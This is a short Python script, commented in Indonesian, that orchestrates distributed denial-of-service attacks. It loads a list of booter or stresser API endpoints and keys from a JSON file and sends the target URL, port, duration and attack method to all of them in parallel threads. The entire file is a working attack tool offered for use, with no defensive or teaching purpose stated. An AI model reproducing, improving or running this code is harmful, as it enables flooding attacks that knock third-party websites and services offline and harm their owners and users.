import json
import os
import requests
import argparse
import threading

# Fungsi untuk membaca API dari api.json
def load_api_config(file_path):
    try:
        with open(file_path, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        print(f"Error: File {file_path} tidak ditemukan.")
        return []
    except json.JSONDecodeError:
        print(f"Error: File {file_path} tidak valid.")
        return []

# Fungsi untuk menjalankan serangan menggunakan API
def start_attack(url, port, duration, method, base_url, api_key):
    try:
        api_url = f"{base_url}?key={api_key}&host={url}&port={port}&time={duration}&method={method}"
        response = requests.get(api_url)
        if response.status_code == 200:
            print(f"Attack berhasil dikirim ke {base_url}!")
            print(f"Response: {response.text}")
        else:
            print(f"Error: API {base_url} mengembalikan status {response.status_code}")
            print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error: Gagal mengirim permintaan ke {base_url} - {e}")

# Fungsi untuk menangani serangan ke semua API
def attack_all_apis(url, port, duration, method, api_configs):
    threads = []
    
    # Membuat dan menjalankan thread untuk setiap API
    for config in api_configs:
        base_url = config["base_url"]
        api_key = config["api_key"]
        thread = threading.Thread(target=start_attack, args=(url, port, duration, method, base_url, api_key))
        threads.append(thread)
        thread.start()
    
    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

# Fungsi utama untuk menerima argumen dari CLI
def main():
    parser = argparse.ArgumentParser(description="Jalankan serangan melalui beberapa API")
    parser.add_argument("url", type=str, help="URL target serangan")
    parser.add_argument("port", type=int, help="Port target serangan")
    parser.add_argument("duration", type=int, help="Durasi serangan dalam detik")
    parser.add_argument("method", type=str, help="Metode serangan (misal: tls, http, dll)")

    args = parser.parse_args()

    # Load konfigurasi API dari file
    api_config = load_api_config("api.json")

    # Menjalankan serangan ke semua API yang ada
    attack_all_apis(args.url, args.port, args.duration, args.method, api_config)

# Memulai program
if __name__ == "__main__":
    main()
